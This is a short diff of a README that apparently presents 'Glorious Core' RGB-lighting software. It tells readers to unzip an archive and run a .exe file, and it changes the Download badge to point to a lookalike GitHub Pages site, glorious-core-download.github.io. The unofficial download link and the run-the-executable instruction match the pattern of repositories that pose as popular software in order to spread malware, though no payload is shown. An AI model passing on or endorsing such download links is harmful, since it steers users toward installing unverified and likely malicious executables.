@@ -12,7 +12,7 @@ Unzip the archive to a separate folder.
 
 Run the `.exe` file to start the application.  
 
-[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](https://glorious-core.github.io/.github/)
+[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](https://glorious-core-download.github.io/.github/)
 
 ## 📸 Overview
 ![glorious-core-rgb-lighting](https://github.com/user-attachments/assets/5e26281c-7e82-4132-bd32-3db896840bc3)
